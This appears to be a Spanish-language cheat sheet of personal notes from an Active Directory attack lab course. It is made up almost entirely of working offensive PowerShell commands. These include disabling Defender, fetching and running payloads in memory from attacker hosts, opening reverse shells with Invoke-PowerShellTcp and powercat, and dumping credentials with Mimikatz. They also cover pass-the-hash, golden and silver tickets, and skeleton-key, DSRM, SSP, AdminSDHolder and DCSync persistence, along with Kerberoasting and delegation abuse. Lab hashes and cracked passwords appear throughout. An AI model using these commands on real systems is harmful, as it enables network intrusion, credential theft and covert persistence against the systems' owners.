# Comandos Básicos de PS
-----------------------
* `Set-MpPreference -DisableRealtimeMonitoring $true -Verbose VERBOSE: Performing operation 'Update MSFT_MpPreference' on Target 'ProtectionManagement'.`
* `Get-Help Get-Item -Examples` --> ejemplos de Get-Item
* `Import-Module <path>`  -> importar modulo a la sesioón
* `Get-Command -Module <module name>` -> ver las funciones del modulo
* `Invoke-Command -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local -ScriptBlock{whoami;hostname}` --> Ejecuta el comando en la máquina remota en la que tenemos privilegios, en vez de ScriptBlock se puede poner FilePath para ejecutar un script. Se puede importar un módulo en tu máquina y ejecutarlo en la máquina remota con:
* `Invoke-Command -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local -ScriptBlock{function:Bypass}`
Esta técnica puede evadir  la politica de ejecución restringida del FilePath
* `klist` listamos los tickets en nuestra sesión
* `powershell.exe iex (iwr http://172.16.100.46/Invoke-PowerShellTcp.ps1);InvokePowerShellTcp -Reverse -IPAddress 172.16.100.46 -Port 443` --> `powercat -l -p 443 -v -t 1024`

* `Invoke-SMBExec -Target 172.16.2.1 -Domain dcorp-dc -Username Administrator -Hash a102ad5753f4c441e3af31c97fad86fd -Command "powershell.exe -Exec Bypass -Command ""& iex (iwr http://172.16.100.46/Invoke-PowerShellTcp.ps1 -UseBasicParsing); Invoke-PowerShellTcp -Reverse -IPAddress 172.16.100.46 -Port 443"""`  --> `powercat -l -p 443 -v -t 1024`


# Descargar Ficheros
-------------------

* iex (New-Object Net.WebClient).DownloadString('https://webserver/payload.ps1')` --> Descargar en memoria un módulo o lo ejecuta en caso de ser ejecutable

* `$ie=New-Object -ComObject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://192.168.230.1/evil.ps1');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response` --> alternativa

* `PSv3 onwards - iex (iwr 'http://192.168.230.1/evil.ps1')`

* `$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://192.168.230.1/evil.ps1',$false);$h.send();iex $h.responseText`

* `$wr = [System.NET.WebRequest]::Create("http://192.168.230.1/evil.ps1")` & `$r = $wr.GetResponse()` & `IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()`

#Enumeración
------------
* `$ADClass = [System.DirectoryServices.ActiveDirectory.Domain]`
* `$ADClass::GetCurrentDomain()`

Se puede usar PowerView y se puede usar el módulo de ActiveDirectory para Powerwshell, más útil PowerView pero si está activado el uso unicamente de binarios firmados será necesario usar el original.

## Current domain
* `Get-NetDomain`
* `Get-ADDomain`

## Object of another domain
* `Get-NetDomain –Domain moneycorp.local`
* `Get-ADDomain -Identity moneycorp.local`

##  Domain SID for the current domain
* `Get-DomainSID`
* `(Get-ADDomain).DomainSID`

## Domain Policy
* `Get-DomainPolicy`
* `(Get-DomainPolicy)."system access"`

## DOmain controller
* `Get-NetDomainController`
* `Get-ADDomainController`

# Users
* `Get-NetUser -Username student1`
* `Get-ADUser -Identity student1 -Properties *`

## Máquinas en las que el usuario actual es administardor local (ruidoso)
* `Find-LocalAdminAccess –Verbose`
* Con la herramienta Find-WMILocalAdminAccess.psa pones los equipos en un txt (Get-NetComputer)`Find-WMILocalAdminAccess -ComputerFile .\computers.txt`

## Sesión en la máquina en la que tu eres administrador local
* `Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local`
* ` $sess = New-PSSession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local`
* ` iex (iwr http://172.16.100.46/Invoke-Mimikatz.ps1 -UseBasicParsing)`
* `Invoke-command -ScriptBlock {Set-MpPreference -DisableIOAVProtection $true} -Session $sess`
* `Invoke-command -ScriptBlock ${function:Invoke-Mimikatz} -Session $sess`

## Busca máquinas que tengan algún usuario como administardor local
* `Invoke-EnumerateLocalAdmin`

## Buscar máquinas en las que algún miembro de admin u otro grupo tenga sesiones abiertas
* `Invoke-UserHunter -GroupName "RDPUsers"`
* `Invoke-UserHunter -CheckAccess` Para comprobar que tenemos acceso a esa máquina



## Properties Users
* `Get-UserProperty –Properties pwdlastset | Where-Object { $_.name -like '*student5*' }`
* `Get-ADUser -Filter * -Properties * | select name,@{expression={[datetime]::fromFileTime($_.pwdlastset)}} | Where-Object { $_.name -like '*student5*' }`

## String in atributes
* `Find-UserField -SearchField Description -SearchTerm "built"`
* `Get-ADUser -Filter 'Description -like "*built*"' -Properties Description | select name,Description`

# Computers
* `Get-NetComputer`
* `Get-ADComputer -Filter * | select Name`

* `Get-NetComputer –OperatingSystem "*Server 2016*"`
* `Get-ADComputer -Filter 'OperatingSystem -like "*Server 2016*"' -Properties OperatingSystem | select Name,OperatingSystem`

* `Get-NetComputer -Ping`
* `Get-ADComputer -Filter * -Properties DNSHostName | %{TestConnection -Count 1 -ComputerName $_.DNSHostName}`

* `Get-NetComputer -FullData`
* `Get-ADComputer -Filter * -Properties *`


## Computers donde el usuario actual es local admin
* `Find-LocalAdminAccess`
* Find-WMILocalAdminAccess.ps1 tambien ayuda

## Local Admins en todas las máquinas del dominio
* `Invoke-EnumerateLocalAdmin`

## máquinas en las que alguien de algún grupo tiene sesión
* `Invoke-UserHunter -GroupName "RDPUsers"`

## Comprovar el acceso desde una máquina en otra
* `Invoke-UserHunter -CheckAccess`
* `Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName dcorpmgmt.dollarcorp.moneycorp.local`

## máquinas donde el domain admin tiene sesión abiertas
* `Invoke-UserHunter -Stealth`



# Groups
* `Get-NetGroup`
* `Get-ADGroup -Filter * | select Name`

* `Get-NetGroup –FullData`
* `Get-ADGroup -Filter * -Properties *`

Hay algunos grupos que solo están disponibles en el dominio raiz cómo los enterprise admins
## Member of group
* `Get-NetGroupMember -GroupName "Domain Admins" -Recurse`
* `Get-ADGroupMember -Identity "Domain Admins" -Recursive`

Recursive es para cuando un grupo está dentro de otro grupo y la busqueda se hace resursiva

## Groups for user
* `Get-NetGroup –UserName "student1"`
* `Get-ADPrincipalGroupMembership -Identity student1`

## Local Groups in a machine (need local admin)
* `Get-NetLocalGroup -ComputerName dcorp-dc.dollarcorp.moneycorp.local -ListGroups`

# Loggins
## Usuarios activos en una máquina, necesitas administardor local en el objetivo
* `Get-LoggedonLocal -ComputerName dcorp-dc.dollarcorp.moneycorp.local`
## Usuarios logeados en local en una máquina
* `Get-LoggedonLocal -ComputerName dcorp-student5.dollarcorp.moneycorp.local`
## Último usuario logado en una máquina
* `Get-LastLoggedOn –ComputerName dcorp-student5.dollarcorp.moneycorp.local`

# Shared
* `Invoke-ShareFinder -ExcludeStandard -ExcludePrint -ExcludeIPC`
* `Invoke-FileFinder`  -> muchas opciones de busqueda
* `Get-NetFileServer -Verbose`

# GPOs
* `Get-NetGPO | select displayname`
* `Get-NetGPO Get-NetGPO -ComputerName dcorp-student5.dollarcorp.moneycorp.local`
* `gpresult /R` --> GPOs en la máquina local
* ` Get-NetGPOGroup`  --> IMportante pero no se porque

## Users which are in a local group of a machine using GPO
* `Find-GPOComputerAdmin –Computername dcorp-student1.dollarcorp.moneycorp.local` --> hace falta admin
## Machines where the given user is member of a specific group
* `Find-GPOLocation -UserName student1 -Verbose`

# APPLocker
* ` $ExecutionContext.SessionState.LanguageMode` Para ver la politica si está en contrainedlanguage es que está activado
* `Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections` Para ver las reglas, por ejemplo "PathConditions: {%PROGRAMFILES%\*}"


#OU Unadidades organizativas 
* `Get-NetOU -FullData`
* `Get-ADOrganizationalUnit -Filter * -Properties *`

## Para saber que GPO está activada en que OU
* `Get-NetGPO -GPOname "{AB306569-220D-43FF-B03B-83E8F4EF8081}" (id sacado de la ou)` 
* `Get-GPO -Guid AB306569-220D-43FF-B03B-83E8F4EF8081`

## Saber que equipos están en una OU
* `Get-NetComputer -ADSpath "OU=StudentMachines,DC=dollarcorp,DC=moneycorp,DC=local" -FullData | select Name,DNSHostName,LastLogonDate`
* `Get-ADComputer -Filter * -SearchBase "OU=StudentMachines,DC=dollarcorp,DC=moneycorp,DC=local" -Properties * | Select -Property Name,DNSHostName,LastLogonDate`

# ACLs - Security descriptors
Son una lista de ACEs (Access Control Entries), tienen un dueño y son de dos tipos
* DACL - Definen los permisos de un usuario o grupo a un objeto
* SACL - Loga sucesos satisfactorios o fallidos cuando un objeto es accedido

## ACLs asociadas a un objeto especifico
* `Get-ObjectAcl -SamAccountName student1 –ResolveGUIDs`

## Ver ACLS asociadas a un prefix determinado
* `Get-ObjectAcl -ADSprefix 'CN=Administrator,CN=Users' -Verbose`
* `(Get-Acl 'AD:\CN=Administrator,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local').Access`

## ACLs asociadas a un LDAP
* `Get-ObjectAcl -ADSpath "LDAP://CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local" -ResolveGUIDs -Verbose`

## ACLs interesantes y faciles de explotar
* `Invoke-ACLScanner -ResolveGUIDs`

## ACLs con una ruta determinada
* `Get-PathAcl -Path "\\dcorp-dc.doolarcorp.moneycorp.local\sysvol"`

## ACLs de un grupo
* `Get-ObjectAcl -SamAccountName "Users"`
* `Get-ObjectAcl -SamAccountName "Users" -ResolveGUIDs | ?{$_.IdentityReference -match 'Key Admins'}` De un usuario concreto

# Trust - Confianza
La confianza puede ser de varios tipos:
* Unidireccional, un dominio confia en otro y es el segundo el que puede acceder al primero
* Bidireccional
* Transitividad propiedad por la que un dominio confia en otro y ese a su vez en otro.
* No transitivo, es la configuración por defecto entre dos dominios de bosques diferentes que no confien entre ellos
* Padre-hijo, creada de manera automática entre un dominio y su raiz, es siempre bidireccional.
* Arbol-Bosque Raiz, se crea automaticamente con la creación de un nuevo dominio en el bosque, bidireccional y transitiva.
* Enlace de confianza, se puede crear entre dominios o bosques no relacionados directamente pero que pertenecen al mismo bosque raiz, unidireccional o bidireccional.
* Confianza externa entre dos dominios de diferentes bisques raiz, puede ser unidireccional o bidireccional y no transitiva.
* Confianza de bosque, es entre dominios raiz, transitiva o no.

## Dominios de confianza
* `Get-NetDomainTrust –Domain us.dollarcorp.moneycorp.local`
* `Get-ADTrust –Identity us.dollarcorp.moneycorp.local`

* `Get-NetForestDomain -Verbose | Get-NetDomainTrust` --> Ver la confianza entre los dominios del bosque
* `Get-NetForestDomain -Verbose | Get-NetDomainTrust | ?{$_.TrustType -eq 'External'}` --> Confianzas externas
* `Get-NetDomainTrust | ?{$_.TrustType -eq 'External'}` --> igual

# Forest

* `Get-NetForest –Forest eurocorp.local`
* `Get-ADForest –Identity eurocorp.local`

## Todos los dominios de un bosque
* `Get-NetForestDomain`
* `(Get-ADForest).Domains`

## Catalog ¿?
* `Get-NetForestCatalog`
* `Get-ADForest | select -ExpandProperty GlobalCatalogs`

## Mapa de confianza del bosque ¿?
* `Get-NetForestTrust –Forest eurocorp.local`
* `Get-ADTrust -Filter 'msDS-TrustForestTrustInfo -ne "$null"'`

# Elevación
## PowerUp
* `Get-ServiceUnquoted`
* `Get-ModifiableServiceFile`
* `Get-ModifiableService` --> Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\student46' y te añade a administradores
* `Invoke-AllChecks`

## BeRoot
* `.\beRoot.exe`

## Privesc
* `Invoke-PrivEsc`

# Remote Powerwshell
## 1-1 Para no cerrar la sessión, si directamente hacer el Enter-PSSession con el ComputerName cuando sales se cierra.
* `$sess = New-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local`
* `Enter-PSSession -Name $sess`

## 1-N 
* `Invoke-Command –Scriptblock {Get-Process} -ComputerName (Get-Content <list_of_servers>)` 
* `Invoke-Command -Session $sess -FilePath C:\AD\Invoke-Mimikatz.ps1`

# Mimikatz
* `Inovke-Mimikatz` Lanzar comando básico de -DumpCreds

# Shell en jenkings (user: builduser, builduser)
* `powercat -l -p 443 -v -t 1024`
* `powershell.exe iex (iwr http://172.16.100.46/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Invoke-PowerShellTcp -Reverse -IPAddress 172.16.100.46 -Port 443`


## Pash the hash
* `Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:powershell.exe"'` Lanza un proceso de powershell con el hash del usuario svcadmin
* `Invoke-Mimikatz -Command '"lsadump::lsa /patch"' –Computername dcorp-dc` Saca todos los hashes de los usuarios del dominio incluido el del "krbtgt"
* `Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'` Saca el hash de "krbtgt" de una manera más silenciosa y sin tener que ejecutar mimikatz en el DC

## Silver ticket
Utilizamos el hash de un admin para pedir un TGS de un servicio concreto.
* `Invoke-Mimikatz -Command '"kerberos::golden /admin:svcadmin /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-268341927-4156871508-1792461683 /target:dcorp-mssql.dollarcorp.moneycorp.LOCAL /service:cifs /ntlm:b38ff50264b74508085d82c69794a4d8  /ptt"'`
* `Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-268341927-4156871508-1792461683 /target:dcorp-mssql.dollarcorp.moneycorp.LOCAL /service:HTTP /rc4:af0686cc0ca8f04df42210c9ac980760 /user:Administrator /ptt"'`

## Golden Ticket
Nos permite generar un ticket con las credenciales del "krbtgt" para poder acceder con ese ticket a cualquier servicio del cominio.
* `Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'` Para crear un golden ticket
** sid es del dominio
** id es del usuario (por defecto 500)
** groups es del usurio por defecto 512 513 518 519 520
** ptt es para añadir el ticket al proceso de powershell y si no poner /ticket para ponerlo en fichero
** si tiene cifrado aes poner /aes128 y/o /aes256
** startoffset momento de inicio del ticket en minutos
** endin expiración del ticket en minutos por defecto son 10 años, el AD los crea de 600 minutos (10 horas)
** renewmax periodo máximo de renovación por defecto 10 años, el AD lo pone a 100800 (7 dias)
** Se puede lanzar sobre un usuario sin ningun tipo de permisos sobre la máquina o dominio (¿AV?)

## Skeleton Key
Ataque que parchea el proceso lsass en el DC y permite que cualquier usuario se logue en el dominio con una contraseña predefinida.  Este método de persistencia se pierde cuando el DC es reiniciado.

* `Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dcor-pdc.dollarcorp.moneycorp.local` --> la contraseña que pone es "mimikatz"
** Enter-PSSession -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Credentials dcorp\administrator
Si el proceso está protegido puedes hacerlo cargando el driver mimidriv.sys localmente en el dc. Mucho más ruidoso. Pag. 128.

## DSRM - Directory Services Restore Mode
Es la contraseña del usuario Administrator (local) en el DC.
Es una contraseña necesaria para promocionar a un servidor como controlador de dominio, por eso es una contraseña que rara vez es cambiada y es un buen metodo de persistencia.
* `Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'`
Para hacerlo remotamente:
Con el pth de administrator podemos ejecutar:
* `Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -Computername dcorp-dc`

Sacamos el hash de administrator: a102ad5753f4c441e3af31c97fad86fd
Para comprobar que es diferente vemos que con: 
* `Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dcorp-dc`
Sacamos el hash: af0686cc0ca8f04df42210c9ac980760, se ve que son usuarios diferentesm uno es local y el otro de dominio.

Abrimos una sesión con el DC con el pth de administrator: 
* `Enter-PSSession -ComputerName dcorp-dc`
Y cambiamos el registro: `New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD`  --> Si da error --> `Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2`

Ahora podremos hacer un pth con el hash local:

* `Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"'`

Hay que fijarse que el dominio es el DC no es el dominio ya que vamos a logarnos de manera local. Para acceder al DC debemos ejecutar codigo directamente en el,  PSSession no funciona ya que va a preguntar a kerberos y el no conoce ese hash e Invoke-Command pasa lo mismo.
https://github.com/Kevin-Robertson/Invoke-TheHash/blob/master/Invoke-SMBExec.ps1 permite utilizar un hash para ejecutar comandos en una máquina remota.
 
* `Invoke-SMBExec -Target 172.16.2.1 -Domain dcorp-dc -Username Administrator -Hash a102ad5753f4c441e3af31c97fad86fd -Command "powershell.exe -Exec Bypass -Command ""& iex (iwr http://172.16.100.46/Invoke-PowerShellTcp.ps1 -UseBasicParsing); Invoke-PowerShellTcp -Reverse -IPAddress 172.16.100.46 -Port 443"""`  --> `powercat -l -p 443 -v -t 1024`

## Custom SSP -Security Support Provider
Es una dll que ofrece servicios de autenticación remota, algunos son NTLM, Kerberos...
Mimikatz ofrece una dll personalizada "mimilib.dll" y ofrece la posibilidad de ver en texto claro las credenciales en los logs.
### Hay dos metodos para conseguirlo:
Desde el DC como admins:
* `IEX(New-Object System.Net.WebClient).DownloadFile('http://172.16.100.46/mimilib.dll', "C:\Windows\System32\mimilib.dll")`
* `$packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages'| select -ExpandProperty 'Security Packages'`
* `$packages += "mimilib"`
* `Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packages`
* `Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' -Value $packages`
Hay que reiniciar la máquina y comenzaria a logar los loggins. Se puede modificar la dll para que escriba los log en sysvol o algún sitio que sea completamente accesible para cualquier usuario y así no tener que volver a entrar para ver las credenciales.
---------------------------
Invoke-Mimikatz -Command '"misc::memssp"' --> Inestable en Windows Server 2016 sin necesidad de reiniciar.

Cuando salimos y volvemos a entrar podemos ver en el fichero:
type C:\Windows\System32\kiwissp.log 
[00000000:003f22c4] [00000004] dcorp\Administrator (Administrator)      *DollarMakesEveryoneHappy

## AdminSDHolder
AdminSDHolder es un contenedor en el dominio que se utiliza como plantilla para las ACL de los grupos más restrictivos como los administradores de dominio. Si conseguimos modificar los permisos de ese contenedor, de manera delegada tendremos los permisos sin necesidad de estar en el grupo de administradores de dominio.
Cada hora se compara la ACL de AdminSDHolder con la de los grupos sobre escribiendose la de los grupos.
POdemos hacerlo con powerview:
* `Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName student46 -Rights All -Verbose` --> Control total
* `Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName student46 -Rights ResetPassword -Verbose` --> Añadir permisos de resetear contraseñas
* `Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName student46 -Rights WriteMembers -Verbose` --> Añade permisos de añadir miembros a grupos

Con el modulo de ActiveDirectory:
* `Set-ADACL -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local' -Principal student46 -Verbose`

Con el script Invoke-SDPropagator.ps1 forzamos la propagación de las ACl:
* `Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose`

Vemos si realmente está en el grupo que lo hemos metido
* `Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'student46'}`
* `Get-NetGroupMember -GroupName "Domain Admins"` --> No veremos al nuevo usuario y no podremos acceder con el al CD por ejemplo.

Teniendo control total con nuestri usuario podemos introducir usuarios en el grupo de administradores:
Con Powerview_dev:
* `Add-DomainGroupMember -Identity 'Domain Admins' -Members testda -Verbose`
* `Remove-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y'`
Con los permisos de ResetPassword:
* `Set-DomainUserPassword -Identity testda -AccountPassword(ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose`

Con Modulo de ActiveDirectory:
* `Add-ADGroupMember -Identity 'Domain Admins' -Members testda`
Con los permisos de ResetPassword:
* `Set-ADAccountPassword -Identity testda -NewPassword(ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose`

$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
New-DomainUser -SamAccountName harmj0y2 -Description 'This is harmj0y' -AccountPassword $UserPassword
-----------
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
New-DomainUser -SamAccountName andy -AccountPassword $UserPassword -Credential $Cred | Add-DomainGroupMember 'Domain Admins' -Credential $Cred

## DCSync
Para saber si nuestro usuario tiene permisos de DCSync:
* `Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.IdentityReference -match "student46") -and (($_.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}`
Para añadir los permisos de DCSync al usuario:
* `Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName student46 -Rights DCSync -Verbose`
* `Set-ADACL -DistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -Principal student1 -GUIDRight DCSync -Verbose`
Para sacar un hash del controlador de dominio:
* `Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'`

Video 13
---------
 Security Descriptors
 ---------------------
 Security Descriptor Definition Language es el lenguaje de los security descriptors, se usa para las DACL y las SACL. Modificar esto nos permite ejecutar comandos WMI en el CD. Permite ejecutar comandos sin estar en el grupo de administradores.
 Se organiza en:
 ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid
 
 * `Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose`  Podemos añadir las -Credentials
 * `Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose` Para quitar los permisos del paso anterior

Para habilitar la posibilidad de usar PowerShell en vez de WMI
 * `Set-RemotePSRemoting -UserName student1 -ComputerName dcorp-dc -Verbose`
 * `Set-RemotePSRemoting -UserName student1 -ComputerName dcorp-dc -Remove` Para quitar los permisos del paso anterior

Para modificar el registro del CD y crear un backdoor que le permita al student1 sacar el hash del DC para por ejemplo hacer un silverticket:
* `Add-RemoteRegBackdoor -ComputerName dcorp-dc -Trustee student1 -Verbose`
* `Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose`
* `Get-RemoteLocalAccountHash -ComputerName dcorp-dc -Verbose` Para sacar los hashes de los usuarios locales
* `Get-RemoteCachedCredential -ComputerName dcorp-dc -Verbose` Para sacar las credenciales cacheadas

Kerberoast
--------------
Hay que buscar cuentas de usuario usadas como cuentas de servicio. Lo que hay que hacer es pedir un ticket de servicio al controlador y el te lo devuelve cifrado con la hash del servicio y despues de manera local podemos crakearlo.
Para buscar cuentas de usuario como cuentas de servicio con PowerView:
* `Get-NetUser –SPN`
* `Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName` Con el modulo de AD

Buscamos servicios que no tengan un Principal Name en null
* `Add-Type -AssemblyName System.IdentityModel` 
* `New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local" ` --> Pedimos el TGS del servidor dcorp-mgmt
* `klist` --> para ver los tickets que tenemos
Podemos usar Request-SPNTicket from PowerView para crakear con Hashcat o Jonh de Ripper
* `Invoke-Mimikatz -Command '"kerberos::list /export"'` --> Exportar tickets
* `python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\2-40a10000-student1@MSSQLSvc~dcorpmgmt.dollarcorp.moneycorp.localDOLLARCORP.MONEYCORP.LOCAL.kirbi`  --> *ThisisBlasphemyThisisMadness!!

Kerperoasting - AS-REPs
--------------------------
Kerberos tiene una opción de preautenticación que por defecto está activada y se puede abusar si está desactivada. Nos permite conseguir el hash ntlmv2 de un usuario. Se trata de bedir un TGT al KDC y despues crakearlo. Esto se ha corregido porque para solocitar el TGT ahora hay que cifrar un timestamp con las credenciales del usuario.
Con Powerview-dev enumerar usuarios que lo tengas desactivado:
* `Get-DomainUser -PreauthNotRequired -Verbose`
Con AD module:
* `Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth`
Con ASREPRoast-master/Invoke-SMBExec
* `Get-ASREPHash -UserName VPN46user -Verbose` --> EL resultado se puede romper con Jonh de Ripper --> resultado Qwertyuiop123
Enumerar los usuarios a los que podemos cambiar las ACLs y desactivar la seguridad en el login y poder hacer el ataque.
* `Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}`
Desactivamos:
* `Set-DomainObject -Identity Control46User -XOR @{useraccountcontrol=4194304} –Verbose`
SI enumeramos otra vez lo vemos.
* `Get-DomainUser -PreauthNotRequired -Verbose`
Volvemos a ver los permisos de los grupos con 
* `Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}`
Los usuarios que tienen GenericAll son vulnerables.
MIramos el serviceprincipalname
* `Get-DomainUser -Identity support46user | select serviceprincipalname`
* `Get-ADUser -Identity supportuser -Properties ServicePrincipalName | select ServicePrincipalName`
Le asiganamos un serviceprincipalname, tiene que ser único en el dominio
* `Set-DomainObject -Identity support46user -Set @{serviceprincipalname='ops/whatever46'}`
* `Set-ADUser -Identity support1user -ServicePrincipalNames @{Add='ops/whatever1'} `
Ahora podemos pedir un ticket a ese servicio
* `Add-Type -AssemblyNAme System.IdentityModel 
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ops/whatever46"`
Sacamos el TGS del servicio que hemos normado para crakear>
*`Request-SPNTicket -SPN ops/whatever46`
Tambien se puede sacar el ticket con mimikatz:
* `Invoke-Mimikatz -Command '"kerberos::list /export"'`
* `python.exe .\tgsrepcrack.py .\10k-worst-pass.txt '1-40a10000-student46@ops~whatever46-DOLLARCORP.MONEYCORP.LOCAL.kirbi'` -->  Support@123 

Unconstrained delegation
--------------------------
Servicios:
------------
File Share - CIFS
● Scheduled Tasks - HOST
● WMI - HOST,RPCSS
● PS Remoting - HOST, HTTP,WSMAN
● WinRM - HTTP, WSMAN

Cuando esta opción está habilitada en un servidor, permite que cualquier servicio pueda impersonar al usuario para acceder a un segundo servicio.
Por ejemplo un servidor web puede impersonal a un usuario para poder acceder a un servidor de bases de datos.
Cuando está activado, cuando el usuario pide un TGS al DC, este mete dentro del TGS el TGT del usuario cifrado con el Hash del servidor, cuando el servidor recibe el TGS descifra el TGT y lo guarda en lsass (un usuario adminiatrador local puede extraer los TGT de los usuarios), el servidor cuando quiere acceder a otro servicio, pide directamente al DC un TGS con el TGT del usuario.
Mirar que servidores tienen activado el unconstrained delegation:
* `Get-NetComputer -UnConstrained`
* `Get-ADComputer -Filter {TrustedForDelegation -eq $True}`
* `Get-ADUser -Filter {TrustedForDelegation -eq $True}`
--> DCORP-APPSRV
COn un usuario que tenga permiso de admin. local en el servidor. (mimikatz)
* `$sess = New-PSSession -ComputerName dcorp-appsrv.dollarcorp.moneycorp.local`
* `Invoke-Command -FilePath C:\AD\Tools\Invoke-Mimikatz.ps1 -Session $sess`
* `Enter-PSSession $sess`
* `Invoke-Mimikatz –Command '"sekurlsa::tickets /export"'`
Nos exporta todos los TGT ceados en la máquina.
Para hace un pash the ticket del ticket del administardor:
* `copy '.\`[0;27aaa1`]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi' \\dcorp-student46.dollarcorp.moneycorp.local\C$\`
* `Invoke-Mimikatz -Command '"kerberos::ptt [0;49742b]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi"'`

Contrained Delegation
------------------------
El usuario se loga en el servidor web, este va al CD y solicita un silveticket para si mismo con las credenciales del usuario, si necesita acceso a un segundo servicio, y tiene marcada la posibilidad de delegar solicita un nuevo tgs para el otro servicio.
* `Get-DomainUser –TrustedToAuth` --> websvc --> CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL, CIFS/dcorp-mssql
* `Get-DomainComputer –TrustedToAuth` --> DCORP-ADMINSRV$
AD MOdule:
* `Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo`
Sacamos el TGT del servidor desde Kekeo:
* `tgt::ask /user:websvc /domain:dollarcorp.moneycorp.local /rc4:cc098f204c5887eaa8253e7c2749156f`

Usamos el TGT para pedir un TGS del otro servidor, desde kekeo:
* `tgs::s4u /tgt:TGT_websvc@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:cifs/dcorp-mssql.dollarcorp.moneycorp.LOCAL`
--------------
* `tgs::s4u /tgt:TGT_websvc@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:host/dcorp-mssql.dollarcorp.moneycorp.LOCAL|rpcss/dcorp-mssql.dollarcorp.moneycorp.LOCAL`
